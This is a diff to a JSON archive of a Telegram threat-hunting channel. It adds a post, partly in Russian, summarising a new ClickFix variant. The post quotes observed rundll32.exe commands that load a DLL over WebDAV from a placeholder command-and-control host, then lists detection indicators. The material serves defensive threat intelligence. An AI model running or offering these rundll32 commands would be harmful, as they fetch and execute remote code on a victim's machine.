@@ -1,8 +1,15 @@
 {
   "channel": "ThreatHuntingFather",
-  "last_update": "2026-03-24T19:14:08.308880+00:00",
-  "messages_count": 155,
+  "last_update": "2026-03-25T05:26:07.418098+00:00",
+  "messages_count": 156,
   "messages": [
+    {
+      "id": "1248",
+      "title": "The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV",
+      "text": "The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV\nМы любим кликфиксы и смотрим за развитием этой техники😁\nThe commands observed during analysis:\nrundll32.exe \\\\ С2@80\\verification.google,#1\nrundll32.exe \\\\С2@80\\verification.google,#1\nrundll32.exe \\\\ С2@80\\verification[.]google,#1\nDetection Logic\nThis activity presents multiple detection opportunities across endpoint and network telemetry:\nExecution of rundll32.exe with davclnt.dll,DavSetCookie\nUse of @80 WebDAV syntax in command-line arguments\nOutbound HTTP connections initiated by rundll32.exe\nSubsequent execution of scripting engines (PowerShell, mshta)\nAccess to suspicious external domains or IP addresses\nПочитать тут, ну и там про детектирование тоже написано 🔗https://www.cyberproof.com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/\n\n[Media: Фото]",
+      "link": "https://t.me/ThreatHuntingFather/1248",
+      "pub_date": "2026-03-24T19:29:36+00:00"
+    },
     {
       "id": "1247",
       "title": "https://drivershield.io/",
